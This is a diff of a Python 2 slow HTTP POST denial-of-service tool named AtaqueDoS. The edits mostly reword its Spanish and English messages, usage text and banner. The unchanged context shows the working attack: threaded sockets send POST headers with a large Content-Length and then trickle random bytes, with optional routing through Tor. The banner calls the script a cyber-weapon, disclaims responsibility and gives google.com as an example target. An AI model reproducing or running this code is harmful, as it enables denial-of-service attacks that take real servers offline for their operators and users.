@@ -55,7 +55,7 @@ class httpPost(Thread):
         self.socks.send("POST / HTTP/1.1\r\n"
                         "Host: %s\r\n"
                         "User-Agent: %s\r\n"
-                        "Coneccion: keep-alive\r\n"
+                        "Connection: keep-alive\r\n"
                         "Keep-Alive: 900\r\n"
                         "Content-Length: 10000\r\n"
                         "Content-Type: application/x-www-form-urlencoded\r\n\r\n" % 
@@ -66,7 +66,7 @@ class httpPost(Thread):
                 self.running = False
                 break
             p = random.choice(string.letters+string.digits)
-            print term.BOL+term.UP+term.CLEAR_EOL+"Posteando: %s" % p+term.NORMAL
+            print term.BOL+term.UP+term.CLEAR_EOL+"Posting: %s" % p+term.NORMAL
             self.socks.send(p)
             time.sleep(random.uniform(0.1, 3))
 	
@@ -79,7 +79,7 @@ class httpPost(Thread):
                     if self.tor:     
                         self.socks.setproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050)
                     self.socks.connect((self.host, self.port))
-                    print term.BOL+term.UP+term.CLEAR_EOL+"Conectando al host..."+ term.NORMAL
+                    print term.BOL+term.UP+term.CLEAR_EOL+"Conectado con el host..."+ term.NORMAL
                     break
                 except Exception, e:
                     if e.args[0] == 106 or e.args[0] == 60:
@@ -93,19 +93,19 @@ class httpPost(Thread):
                     self._send_http_post()
                 except Exception, e:
                     if e.args[0] == 32 or e.args[0] == 104:
-                        print term.BOL+term.UP+term.CLEAR_EOL+"Hilo roto,reiniciando..."+ term.NORMAL
+                        print term.BOL+term.UP+term.CLEAR_EOL+"Hilo roto, Reiniciando..."+ term.NORMAL
                         self.socks = socks.socksocket()
                         break
                     time.sleep(0.1)
                     pass
  
 def usage():
-    print "./ataquedos.py -t <URL> [-r <threads> -p <port> -T -h]"
-    print " -t|--target <Ejemplo: http://google.com>"
-    print " -r|--POST emulaciones <Numero de emulaciones> Por defecto son: 256"
-    print " -p|--port <Puerto del Servidor> Por defecto es: 80"
-    print " -T|--tor Enable tunneling via TOR on 127.0.0.1:9050"
-    print " -h|--help Mostrar esta ayuda" 
+    print "./ataquedos.py -t <objetivo> [-r <hilos> -p <puerto> -T -h]"
+    print " -t|--target <Ejemplo de Servidor : http://google.com>"
+    print " -r|--POST emulaciones <Numero de Emulaciones> Por defecto son 256"
+    print " -p|--port <Puerto del Servidor> Por defecto es 80"
+    print " -T|--tor Habilitar tunelización via TOR on 127.0.0.1:9050"
+    print " -h|--help Mostrar esta Pagina" 
     print "Eg. ./ataquedos.py -t 192.168.1.100 -r 256"
 
 def main(argv):
@@ -141,9 +141,9 @@ def main(argv):
         sys.exit(-1)
 
     print term.DOWN + term.RED + "/*" + term.NORMAL
-    print term.RED + " * target: %s ports: %d" % (target, port) + term.NORMAL
-    print term.RED + " * thread: %d Tor: %s" % (threads, tor) + term.NORMAL
-    print term.RED + " * Espera de 20 a 40 segundos y revisa el sitio." + term.NORMAL
+    print term.RED + " * Target: %s Port: %d" % (target, port) + term.NORMAL
+    print term.RED + " * Threads: %d Tor: %s" % (threads, tor) + term.NORMAL
+    print term.RED + " * Give 20 seconds without tor or 40 with before checking site" + term.NORMAL
     print term.RED + " */" + term.DOWN + term.DOWN + term.NORMAL
 
     rthreads = []
@@ -156,17 +156,18 @@ def main(argv):
         try:
             rthreads = [t.join(1) for t in rthreads if t is not None and t.isAlive()]
         except KeyboardInterrupt:
-            print "\nMatando Todas Las Conecciones...\n"
+            print "\nMatando todas las Conecciones\n"
             for t in rthreads:
                 stop_now = True
                 t.running = False
 
 if __name__ == "__main__":
     print "\n/*"
-    print " *"+term.RED + " AtaqueDoS v2.8.54.10 "+term.NORMAL
-    print " * Slow HTTP POST Server Load Testing Tool"
-    print " * por el programador Andres Nestor Ochoa Navas"
-    print " * No me hago responsable por el uso que le des a esta arma cibernetica."
+    print " *"+term.RED + " AtaqueDoS - Un buen metodo para la reforzar la Seguridad Informatica "+term.NORMAL
+    print " * HailGrasa prros :v"
+    print " * Hecho por Andres Nestor Ochoa Navas"
+    print " * Ruta atravez de Tor"
+    print " * No me Hago responsable del uso que le des a esta ciber-arma letal."
     print " */\n"
 
     main(sys.argv[1:])
